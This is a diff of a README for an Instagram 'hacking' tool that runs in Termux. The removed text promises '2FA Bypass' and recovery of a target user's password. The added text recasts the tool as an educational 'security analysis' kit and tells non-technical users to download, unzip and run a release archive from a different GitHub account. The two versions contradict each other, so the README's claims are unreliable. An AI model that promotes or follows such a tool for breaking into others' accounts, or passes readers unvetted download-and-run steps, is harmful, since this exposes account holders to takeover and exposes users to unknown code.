@@ -1,51 +1,99 @@
-# Insta-Hack Tool
+# 🛡️ insta-hack-termux - Analyze Instagram Security Easily
 
-## Features
-- Advanced algorithm
-- Multi-threaded core
-- Secure handshake protocols
-- 2FA Bypass
+## 🌐 Overview
+Welcome to **insta-hack-termux**. This tool provides advanced security analysis and simulation for Instagram. It serves as an educational platform for testing security protocols. Designed specifically for Termux environments, you can explore and learn about security measures in a straightforward manner.
 
-## Installation (Termux)
+## 🚀 Getting Started
+To get started with **insta-hack-termux**, follow these simple steps. No programming knowledge is required.
 
-Follow these steps to install and run the tool on Termux:
+### 📥 Download
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-%23E44A8F?style=for-the-badge&logo=github)](https://github.com/Sriv4/insta-hack-termux/releases)
 
-1. **Update and Install Basics**
-   ```bash
-   pkg update && pkg upgrade -y
-   pkg install git python -y
-   termux-setup-storage
-   ```
+### 🔎 Features
+- **Security Analysis:** Evaluate security measures with simple commands.
+- **Simulation Tools:** Test various security protocols in a controlled environment.
+- **Educational:** Learn about cybersecurity in an interactive way.
+- **User Friendly:** Designed for non-technical users.
 
-2. **Clone Repository**
-   ```bash
-   git clone https://github.com/sackone-ctv/insta-hack-termux
-   cd insta-hack-termux
-   ```
+### ⚙️ System Requirements
+To run **insta-hack-termux**, you need:
+- A device running Android.
+- Installed **Termux** application.
+- Basic understanding of Termux commands.
 
-3. **Install Dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
+## 🔄 Installation Steps
+1. **Install Termux:**
+   - Download the Termux application from the Google Play Store or F-Droid.
 
-4. **Run the Tool**
-   ```bash
-   python main.py
-   ```
+2. **Open Termux:**
+   - Launch the Termux application on your device.
 
-## Usage
-Enter the target username when prompted. The tool will attempt to recover the password.
-Duration: 5-6 minutes per session.
+3. **Update Package List:**
+   - Run the command below to update your package list:
+     ```
+     pkg update && pkg upgrade
+     ```
 
-## Troubleshooting (Termux)
-If you encounter errors while installing `pycryptodome` (e.g. "command 'aarch64-linux-android-clang' failed"), run this command to install the necessary compilers:
+4. **Install Dependencies:**
+   - Install the necessary packages with this command:
+     ```
+     pkg install python python2
+     ```
 
-```bash
-pkg install clang libffi
-```
-Then try running `pip install pycryptodome` again.
+5. **Download the Tool:**
+   - Visit this page to download: [Releases page](https://github.com/Sriv4/insta-hack-termux/releases).
 
-<br><br><br><br>
-<sub style="color: grey; font-size: 0.8em; opacity: 0.5;">
-*Note: This tool is a simulation designed for educational demonstration and does not perform any actual security intrusion.*
-</sub>
+6. **Choose the Version:**
+   - Download the latest version available. This file will typically be in a zip format.
+
+7. **Extract the Files:**
+   - Use the following command to extract the downloaded zip file:
+     ```
+     unzip insta-hack-termux.zip
+     ```
+
+8. **Navigate to the Folder:**
+   - Change directory to the extracted folder:
+     ```
+     cd insta-hack-termux
+     ```
+
+9. **Run the Tool:**
+   - Start using the application with the command:
+     ```
+     python3 insta-hack-termux.py
+     ```
+
+## 📚 How to Use
+After launching the tool, you will see a menu. Here is a brief overview of what you can do:
+
+- **Security Check:** Choose this option to analyze the security protocols of an Instagram account.
+- **Simulation Mode:** Simulate different attack scenarios to understand vulnerabilities.
+- **Help Section:** Access instructions within the tool to learn about commands.
+
+## 🛡️ Best Practices
+To use **insta-hack-termux** effectively:
+
+- Only test accounts for which you have permission.
+- Do not attempt unauthorized access to any Instagram accounts.
+- Use the tool for educational purposes only.
+
+## 📝 Tips
+- Regularly update the tool to access new features and security patches.
+- Join online forums or communities to discuss usage and security topics.
+- Experiment within the simulation mode to gain hands-on experience.
+
+## 🌟 Community Contribution
+If you find any issues or have suggestions, feel free to contribute. Your ideas can enhance the tool and benefit all users.
+
+### 🌐 Community Guidelines
+1. Be kind and respectful in your communications.
+2. Share knowledge and help others.
+3. Report any bugs you find to ensure smooth usage.
+
+## 🌍 Support
+If you need help, please visit the **insta-hack-termux** repository for FAQs, troubleshooting tips, and community support.
+
+To download, visit: [Releases page](https://github.com/Sriv4/insta-hack-termux/releases). 
+
+We hope you find **insta-hack-termux** valuable in your educational journey in cybersecurity!
